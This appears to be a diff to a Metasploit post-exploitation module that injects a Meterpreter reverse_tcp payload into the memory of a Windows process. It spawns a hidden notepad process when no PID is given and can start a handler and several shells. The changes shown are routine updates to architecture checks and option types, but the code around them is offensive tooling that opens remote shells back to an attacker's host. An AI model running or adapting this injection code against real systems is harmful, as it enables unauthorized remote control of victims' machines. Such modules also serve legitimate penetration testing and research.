@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/post/common'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Common
 
   def initialize(info={})
@@ -30,13 +27,13 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into memory of a process.', "windows/meterpreter/reverse_tcp"]),
-        OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
+        OptAddressLocal.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
         OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
         OptInt.new('PID', [false, 'Process Identifier to inject of process to inject payload.']),
         OptBool.new('HANDLER', [ false, 'Start an exploit/multi/handler to receive the connection', false]),
         OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."]),
         OptInt.new('AMOUNT',  [false, 'Select the amount of shells you want to spawn.', 1])
-        ], self.class)
+        ])
   end
 
   # Run Method for when run command is issued
@@ -63,7 +60,7 @@ class MetasploitModule < Msf::Post
     if pid == 0 or not has_pid?(pid)
       pid = create_temp_proc(payload)
     end
-    if payload.arch.join =~ /64/ and client.platform =~ /x86/
+    if payload.arch.join == ARCH_X64 and client.arch == ARCH_X86
       print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
       print_error("Migrate to an x64 process and try again.")
       return false
@@ -161,13 +158,13 @@ class MetasploitModule < Msf::Post
   def create_temp_proc(pay)
     windir = client.sys.config.getenv('windir')
     # Select path of executable to run depending the architecture
-    if pay.arch.join == "x86" and client.platform =~ /x86/
+    if pay.arch.join == ARCH_X86 and client.arch == ARCH_X86
       cmd = "#{windir}\\System32\\notepad.exe"
-    elsif pay.arch.join == "x86_64" and client.platform =~ /x64/
+    elsif pay.arch.join == ARCH_X64 and client.arch == ARCH_X64
       cmd = "#{windir}\\System32\\notepad.exe"
-    elsif pay.arch.join == "x86_64" and client.platform =~ /x86/
+    elsif pay.arch.join == ARCH_X64 and client.arch == ARCH_X86
       cmd = "#{windir}\\Sysnative\\notepad.exe"
-    elsif pay.arch.join == "x86" and client.platform =~ /x64/
+    elsif pay.arch.join == ARCH_X86 and client.arch == ARCH_X64
       cmd = "#{windir}\\SysWOW64\\notepad.exe"
     end
     # run hidden
